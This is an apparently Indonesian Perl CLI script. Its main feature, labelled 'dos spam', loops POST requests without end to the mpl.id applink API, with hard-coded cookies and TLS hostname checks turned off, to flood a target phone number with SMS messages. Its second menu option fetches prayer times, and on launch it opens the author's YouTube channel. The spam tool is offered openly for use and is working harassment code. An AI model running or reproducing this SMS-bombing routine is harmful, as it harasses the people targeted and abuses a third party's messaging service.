#!/bin/perl

# author : Speedrun
# github : Speedrun-bash && Bayu12345677
# subrek pejuang kentang

use strict;
use warnings;
use threads;
use POSIX qw(strftime);
use feature qw(say);

#use IO::Socket::SSL
use Net::SSLeay;
use HTTP::Request;
use LWP::UserAgent;
use JSON qw(decode_json);
use JSON::MaybeXS qw(encode_json);
use Term::ANSIColor;

my $bi = color("bold blue");
my $ku = color("bold yellow");
my $m = color("bold magenta");
my $ij = color("bold green");
my $me = color("bold red");
my $hi = color("black");
my $cy = color("bold cyan");
my $pu = color("bold white");
my $st = color("bold reset");

sub banner {
    my $wk = strftime("%H:%M:%S",localtime);
    my $dt = strftime("%a %b %e", localtime);
    my @epep = ($ku,$me,$ij,$cy,$m);
    my $random1 = `shuf -i 0-4 -n 1`;
    my $random2 = `shuf -i 0-4 -n 1`;

    print("${m}╔╦╗╔═╗╦    ${ij}╔═╗${me}╦  ╦${ij}╦${bi}╦    ${ku}* ${pu}Author  ${me}:${hi} Speedrun\n");
    print("${m}║║║╠═╝║    ${ij}║╣ ${me}╚╗╔╝${ij}║${bi}║    ${cy}* ${pu}github  ${me}:${hi} Speedrun-bash && Bayu12345677\n");
    print("${m}╩ ╩╩  ╩═╝  ${ij}╚═╝ ${me}╚╝ ${ij}╩${bi}╩═╝  ${bi}* ${pu}youtube ${me}:${hi} pejuang kentang\n");
    print("\033[1;41;37m           (selamat menunaikan ibadah bulan Ramadhan)                       ${st}\n");
    print("\n");
    print("${ij}-${m}>${pu} time${hi} ${wk}\n");
    print("${ij}-${m}>${pu} date${hi} ${dt}${st}\n\n");
}

sub spam {
    my ($nomer,$juml) = @_;
    STDOUT->autoflush(1);

    my $apis = "https://www.mpl.id/api/applink";
    my $heder = [
        'accept' => 'application/json',
        'accept-encoding' => 'gzip, deflate, br',
        'accept-language' => 'en-US,en;q=0.9',
        'content-type' => 'application/json',
        'cookie' => '_gcl_au=1.1.173982943.1648991375; _gid=GA1.2.1916794866.1648991376; _fbp=fb.1.1648991376707.690110363; _uetsid=79fac830b35111ec9fba4d813d4ded86; _uetvid=79fb5060b35111eca6ba1909185337e2; _hjSessionUser_1696874=eyJpZCI6IjEzOGQzM2Y0LWQ4YzctNTczNS1hOTc5LTg5MWNjOTM3ODQzYiIsImNyZWF0ZWQiOjE2NDg5OTIzMDY4NTAsImV4aXN0aW5nIjpmYWxzZX0=; _ga=GA1.2.1722677761.1648991376; _ga_Y2HJP5CQFP=GS1.1.1648992307.1.0.1648993230.60; _ga_X3TGQ1DPDD=GS1.1.1648992307.1.0.1648993230.0; RT="z=1&dm=www.mpl.id&si=57fbc1f9-d810-49d7-b898-d9f69d080ea0&ss=l1k9pnm7&sl=0&tt=0"; _gat_UA-136971790-1=1',
        'origin' => 'https://www.mpl.id',
        'referer' => 'https://www.mpl.id/?mobile=85731184377'
    ];

    my $dr = {"To" => "+62${nomer}","VAR1" => "DEFAULT"};
    my $js = encode_json($dr);
    my $k = 0;

    # loop
    WAIT: for (my $i = 0; $i <= $i; $i++) {
    my $token = HTTP::Request->new(POST => "$apis",$heder,$js);
    my $ua = LWP::UserAgent->new(
        ssl_opts => { verify_hostname => 0 },
        protocols_allowed => ['https'],
    );
    my $req = $ua->request($token);
    my $res = $req->content;

    my $dej = decode_json($res);
    my $result = $dej->{'status'};

    $k++;
    my $tm = strftime("%H:%M:%S",localtime);

   if ($result == 200) {
        print("${me}[${pu}${tm}${me}]${hi} spamming to ${nomer} ${bi}[${ij}V${bi}]$st\n");
    } else {
        print("${me}[${pu}${tm}${me}]${hi} spamming to ${nomer} ${bi}[${me}X${bi}]$st\n");
    }
    if ($k == $juml) {
        say "";
        $k = 0;
        for (my $j = 30; $j >= 0; $j--) {
            sleep(1);
            print("\r${cy}[${me}!${cy}] ${pu}waiting ${me}${j} $st");
        }
        print("\n\n");
    }
    }
}
 
 sub main {
     system("clear");
     banner();
     print("${ku}01. ${hi}dos ${me}spam$st\n");
     print("${ku}02. ${hi}jadwal ${ij}shalat$st\n\n");

     print("${ij}[${hi}Chosse${ij}]${me}> $st");
     my $pp = <>;
     chomp($pp);

    say "\n";
    if ($pp eq "") {
        say("${ij}> ${me}not found${st}\n");
        exit;
    } else {
    if ($pp == 1||$pp == 01) {
        print("${ku}usage ${ij}[${hi}857xxxxxxxx${ij}]$st\n");
        print("${me}Target${m}-${cy}> $st");
        my $tr = <STDIN>;
        chomp($tr);
        say "";

        if($tr eq "") {
            say("${me}>${pu} input tidak boleh kosong${st}\n");
            exit;
        } 

        my $pekerjaan = threads->create(\&spam,"$tr",10);
        my $cetak = $pekerjaan->join();

    } elsif ($pp == 2||$pp == 02) {

        my $TK = HTTP::Request->new(GET => "https://ifconfig.me");
        my $ua = LWP::UserAgent->new;
        my $req = $ua->request($TK);
        my $ip = $req->content;

        my $res = `curl -sL https://api.pray.zone/v2/times/today.json?ip=$ip`;

        my $dec = decode_json($res);
        my @js = @{ $dec->{'results'}{'datetime'} };

        foreach my $f ( @js ) {
            my $im = $f->{'times'}{'Imsak'};
            my $mt = $f->{'times'}{'Sunrise'};
            my $fa = $f->{'times'}{'Fajr'};
            my $dh = $f->{'times'}{'Dhuhr'};
            my $as = $f->{'times'}{'Asr'};
            my $mh = $f->{'times'}{'Maghrib'};
            my $is = $f->{'times'}{'Isha'};
            my $mn = $f->{'times'}{'Midnight'};
        

        my $foo = $dec->{'results'};
        my $ct = $foo->{'location'}{'city'};

        say("${ku}----------${me}[${cy}$ct${me}]");
        say("${m}|");
        say("${m}|${ij}>${pu} imsak           ${me}:${bi} ${im}");
        say("${m}|${ij}>${pu} matahari terbit ${me}:${bi} ${mt}");
        say("${m}|${ij}>$pu fajar           ${me}:${bi} ${fa}");
        say("${m}|${ij}>$pu dzuhur          ${me}:${bi} ${dh}");
        say("${m}|${ij}>$pu asar            ${me}:${bi} ${as}");
        say("${m}|${ij}>$pu magrhib         ${me}:${bi} ${mh}");
        say("${m}|${ij}>$pu isya            ${me}:${bi} ${is}");
        say("${m}|${ij}>$pu tengah malam    ${me}:${bi} ${mn}");
        say("${ku}-------------------------${st}\n");

        }
    }
    }
 }

sub ct {
    say("\n");
    say("> ctrl c detect");
    say("> keluar dari tools\n");
    exit;
}

system("clear");
print "${ij}# ${hi}Subscribe pejuang kentang ya bang ${ku}>${me}_\n";
sleep(6);
system("xdg-open https://www.youtube.com/channel/UCtu-GcxKL8kJBXpR1wfMgWg/");
$SIG{INT} = \&ct;
main();
